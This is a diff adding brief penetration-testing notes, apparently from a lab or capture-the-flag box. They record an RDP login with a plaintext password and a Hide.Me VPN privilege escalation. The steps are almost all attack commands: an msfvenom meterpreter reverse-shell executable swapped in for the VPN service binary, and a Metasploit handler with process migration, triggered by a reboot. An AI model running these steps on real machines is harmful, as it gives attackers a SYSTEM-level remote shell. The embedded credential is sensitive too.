@@ -1,0 +1,20 @@
+in 10.2.2.23 I found carol RDP
+
+rdesktop 10.2.2.22
+carol:carol1978AB
+
+Hide.Me VPN Client 1.2.4 - Local Privilege Escalation - https://www.exploit-db.com/exploits/40071
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > vpnsvc.exe
+
+
+replace in C:\Program Files (x86)\hide.me VPN\vpnsvc.exe
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost IP
+set lport PORT
+set AUTORUNSCRIPT post/windows/manage/migrate 
+
+reboot the machine and wait
